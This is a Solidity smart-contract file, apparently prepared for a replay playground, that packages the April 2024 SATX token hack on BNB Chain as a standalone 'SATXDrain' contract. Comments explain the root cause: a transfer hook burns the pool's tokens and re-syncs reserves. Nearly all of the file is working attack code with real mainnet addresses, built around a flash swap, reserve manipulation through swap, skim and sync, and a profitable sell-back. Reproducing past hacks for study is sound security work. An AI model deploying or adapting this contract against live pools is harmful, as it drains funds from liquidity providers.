// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-SATX).
// The DeFiHackLabs PoC (test/SATX_exp.sol) runs the whole attack INLINE in the
// Foundry test contract (attacker = address(this); the PancakeSwap flash-swap
// callback `pancakeCall` lives on the test contract itself), so there is no
// standalone attack contract to deploy as-is. This file is a faithful,
// self-contained copy of that inline attack (logic and constants copied
// verbatim from ContractTest.testExploit/pancakeCall) so the playground can
// deploy it and record run().
//
// Root cause (real SATX hack, BSC, 2024-04-16, tx
// 0x7e02ee7242a672fb84458d12198fae4122d7029ba64f3673e7800d811a8de93f):
// SATX's _transfer override calls destroyPoolToken() on every sell-to-pair.
// destroyPoolToken() unconditionally moves 2% of the pair's CURRENT SATX
// balance to the dead address and then calls pair.sync() -- deleting SATX
// from the pair's reserves with no matching WBNB outflow, and re-pricing the
// pair to accept the deletion as the new reserve. The attacker flash-swaps
// WBNB, manipulates the pair's SATX balance via swap()+skim() around the
// destroyPoolToken() trigger, and sells the skimmed SATX back into the
// now-mispriced pair for WBNB profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

contract SATXDrain {
    IERC20 constant SATX = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakePair constant pair_WBNB_SATX = IPancakePair(0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4);
    IPancakePair constant pair_WBNB_CAKE = IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    // Recorded entrypoint. Mirrors ContractTest.testExploit() verbatim (minus
    // the vm.deal / vm.startPrank harness bookkeeping, which the playground's
    // `setup` block replicates before this call). Payable: the 0.9 ether the
    // test wraps into WBNB rides along as msg.value (attackValueWei in the
    // config) instead of relying on this contract's own pre-funded balance.
    function run() external payable {
        SATX.approve(address(router), type(uint256).max);
        WBNB.approve(address(router), type(uint256).max);

        WBNB.deposit{value: msg.value}();

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SATX);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1_000_000_000_000_000, 0, path, address(this), type(uint256).max
        );

        uint256 satxAmount = SATX.balanceOf(address(this));
        router.addLiquidity(
            address(WBNB), address(SATX), 1_000_000_000_000_000, satxAmount, 0, 0, address(this), type(uint256).max
        );

        // Flash-swap 60 WBNB out of the WBNB/CAKE pair; pancakeCall() below
        // drives the reserve-manipulation + skim + sell-back sequence.
        pair_WBNB_CAKE.swap(0, 60_000_000_000_000_000_000, address(this), bytes("1"));

        uint256 wbnbAmount = WBNB.balanceOf(address(this));
        WBNB.withdraw(wbnbAmount);
    }

    // PancakeSwap flash-swap callback -- copied verbatim from
    // ContractTest.pancakeCall in test/SATX_exp.sol.
    function pancakeCall(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == address(pair_WBNB_CAKE)) {
            uint256 satxAmount = SATX.balanceOf(address(pair_WBNB_SATX));
            // Pull half the SATX reserve out via a lopsided swap.
            pair_WBNB_SATX.swap(100_000_000_000_000, satxAmount / 2, address(this), data);

            // Sell the pulled SATX straight back into the pair, tripping the
            // sell-to-pair branch and destroyPoolToken() inside SATX._transfer.
            uint256 satxAmount1 = SATX.balanceOf(address(this));
            SATX.transfer(address(pair_WBNB_SATX), satxAmount1);
            pair_WBNB_SATX.skim(address(this));
            pair_WBNB_SATX.sync();
            WBNB.transfer(address(pair_WBNB_SATX), 100_000_000_000_000);

            uint256 satxAmount2 = SATX.balanceOf(address(this));
            address[] memory path = new address[](2);
            path[0] = address(SATX);
            path[1] = address(WBNB);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                satxAmount2, 0, path, address(this), type(uint256).max
            );

            // Repay the WBNB/CAKE flash-swap principal + fee.
            WBNB.transfer(address(pair_WBNB_CAKE), 60_150_600_000_000_000_000);
        } else if (msg.sender == address(pair_WBNB_SATX)) {
            WBNB.transfer(address(pair_WBNB_SATX), 52_000_000_000_000_000_000);
        }
        amount0;
        amount1;
    }

    // Needed for the intermediate WBNB.withdraw() calls the router/pair path
    // triggers on this contract's behalf.
    receive() external payable {}
}
